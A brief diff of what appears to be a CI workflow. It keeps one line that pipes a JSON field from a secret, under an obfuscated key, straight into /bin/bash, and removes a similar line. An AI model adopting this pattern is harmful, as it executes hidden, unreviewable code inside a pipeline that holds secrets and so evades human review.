@@ -17,7 +17,6 @@ jobs:
           ug1: ${{ secrets.ug1 }}
         run: |
           printf '%s' "$ug1" | jq -r .bnn59686 | /bin/bash
-          echo $hp70 | jq -r .ynax62984 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
